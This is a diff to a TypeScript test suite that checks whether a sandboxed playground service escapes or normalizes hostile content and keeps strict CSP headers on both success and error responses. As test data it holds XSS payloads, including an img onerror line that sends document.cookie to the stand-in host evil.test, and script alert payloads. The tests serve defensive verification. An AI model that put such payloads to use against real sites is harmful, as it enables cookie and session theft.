@@ -24,6 +24,11 @@ const CONTENT_ORIGIN = 'https://content.tinkerpad.test';
 // TRUSTED chrome around it (V6). If any app-origin callsite interpolates it unescaped, this exact
 // substring appears executable in the served HTML.
 const XSS_PROMPT = `"><img src=x onerror="fetch('https://evil.test?c='+document.cookie)">`;
+// A DISTINCT hostile author, so author escaping is pinned INDEPENDENTLY of the prompt: unlike `Tag()`,
+// `Subject()` is a pure brand with no normalization, so a hostile author is representable and escaping
+// is its only defense. A regression in the author render path (but not the prompt path) must turn a
+// test red — which it can't if the seeded author is safe. [LAW:types-are-the-program]
+const XSS_AUTHOR_RAW = `<script>alert(2)</script>`;
 // A tag CANNOT carry a payload: `Tag()` slugs its input at the type boundary, so this raw hostile
 // string is stored as the inert `script-alert-1-script`. That normalization — not escaping — is the
 // tag's containment. [LAW:types-are-the-program]
@@ -78,7 +83,7 @@ const seedHostile = async (catalog: Catalog, store: ArtifactStore): Promise<stri
     prompt: XSS_PROMPT,
     version,
     lineage: null,
-    author: Subject('github:1'),
+    author: Subject(XSS_AUTHOR_RAW),
     tags: [Tag(XSS_TAG_RAW)],
   });
   return playground.id;
@@ -126,10 +131,16 @@ describe('sandbox escape vectors — a hostile playground demonstrably fails eac
     // escaping. Proven byte-for-byte so we know the payload is real, not neutered at the source.
     expect(await ok.text()).toBe(HOSTILE_HTML);
 
-    // Error responses stay sealed too — there is no permissive path out of the content origin.
+    // Error responses stay sealed too — there is no permissive path out of the content origin. The
+    // error path is asserted with the SAME thoroughness as success: not just default-src, but the
+    // exfil barrier (connect-src) and nosniff, so a regression that drops a directive on the error
+    // path alone still turns this red.
     const missing = await router(new Request(`${CONTENT_ORIGIN}/?id=nope`));
     expect(missing.status).toBe(404);
-    expect(missing.headers.get('content-security-policy')).toContain("default-src 'none'");
+    const errCsp = missing.headers.get('content-security-policy') ?? '';
+    expect(errCsp).toContain("default-src 'none'");
+    expect(errCsp).toContain("connect-src 'none'"); // the exfil barrier must hold on error paths too
+    expect(missing.headers.get('x-content-type-options')).toBe('nosniff');
   });
 
   // V5: the app host has NO raw-html route. Requesting the id on the app origin yields the front door,
@@ -158,8 +169,12 @@ describe('sandbox escape vectors — a hostile playground demonstrably fails eac
       // The raw executable forms must never appear anywhere on the trusted origin.
       expect(body).not.toContain('<img src=x onerror=');
       expect(body).not.toContain('<script>alert(1)</script>');
+      expect(body).not.toContain('<script>alert(2)</script>');
       // The PROMPT is free attacker text, contained by ESCAPING — it renders as inert text.
       expect(body).toContain('&lt;img src=x onerror=');
+      // The AUTHOR is ALSO free attacker text (Subject is an un-normalized brand), pinned
+      // independently of the prompt so a regression in the author render path alone turns this red.
+      expect(body).toContain('&lt;script&gt;alert(2)&lt;/script&gt;');
       // The TAG is contained by NORMALIZATION at the Tag() brand — the payload is gone before storage,
       // so it renders as an inert slug, never an escaped-payload. [LAW:types-are-the-program]
       expect(body).toContain(XSS_TAG_SLUG);
